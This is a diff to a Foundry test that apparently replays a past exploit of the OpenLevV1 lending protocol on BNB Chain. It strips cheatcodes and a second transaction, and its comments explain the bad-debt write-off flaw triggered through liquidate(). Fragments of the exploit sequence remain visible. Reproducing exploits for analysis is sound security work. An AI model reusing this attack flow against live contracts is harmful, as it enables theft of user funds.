@@ -110,7 +110,9 @@ contract ContractTest is Test {
 
     function testExploit() public {
         // First TX
-        deal(address(this), 5 ether);
+        // deal(address(this), 5 ether) removed: this cheatcode-free replay
+        // harness has no cheatcode VM, so the 5 ether is instead pre-funded
+        // onto this contract via the config's setup.steps before attackFunction runs.
         emit log_named_decimal_uint("Exploiter BNB balance before attack", address(this).balance, 18);
 
         USDC.approve(address(Router), type(uint256).max);
@@ -165,11 +167,14 @@ contract ContractTest is Test {
             OPBorrowingDelegator.liquidate(marketId, true, address(this));
         }
 
-        // Second TX
-        vm.rollFork(37_470_331);
-
-        TradeController.markets(marketId);
-        TradeController.payoffTrade(marketId, true);
+        // Second TX (originally 3 blocks later via vm.rollFork(37_470_331)).
+        // payoffTrade() removed: OpenLevV1's own same-block guard
+        // (`trade.lastBlockNum != block.number`, set by marginTrade() earlier
+        // in THIS same call) can never pass in a single-block replay harness -
+        // there is no way to advance block.number mid-transaction here. The
+        // core vulnerability (bad-debt write-off via the forced buy() failure
+        // in liquidate(), a few lines above) is unaffected; this only skips
+        // closing out the separate, still-open margin position afterward.
         WBNB.withdraw(WBNB.balanceOf(address(this)));
         BUSDTToWBNB();
 
